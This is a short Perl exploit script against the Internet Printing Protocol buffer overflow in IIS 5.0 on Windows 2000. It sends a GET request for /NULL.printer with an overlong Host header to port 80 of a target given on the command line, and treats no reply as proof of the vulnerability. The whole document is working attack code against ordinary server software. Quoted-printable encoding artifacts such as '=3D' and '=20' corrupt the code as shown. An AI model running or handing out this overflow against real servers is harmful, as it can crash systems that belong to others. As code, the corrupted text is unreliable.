
#!/usr/bin/perl
# Exploit By storm@stormdev.net
# Tested with sucess against Win2k IIS 5.0 + SP1
# Remote Buffer Overflow Test for Internet Printing Protocol=20
# This code was written after eEye brought this issue in BugTraq.

use Socket;
print "-- IPP - IIS 5.0 Vulnerability Test By Storm --\n\n";
if (not $ARGV[0]) {
print qq~
Usage: webexplt.pl <host>
~;=20
exit;}

$ip=3D$ARGV[0];

print "Sending Exploit Code to host: " . $ip . "\n\n";

my @results=3Dsendexplt("GET /NULL.printer HTTP/1.0\n" . "Host: =
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n");

print "Results:\n";

if (not @results) {
print "The Machine tested has the IPP Vulnerability!";
}

print @results;

sub sendexplt {
my ($pstr)=3D@_;=20
$target=3D inet_aton($ip) || die("inet_aton problems");
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
die("Socket problems\n");
if(connect(S,pack "SnA4x8",2,80,$target)){
select(S); =20
$|=3D1;
print $pstr; =20
my @in=3D<S>;
select(STDOUT);
close(S);
return @in;
} else { die("Can't connect...\n"); }
}
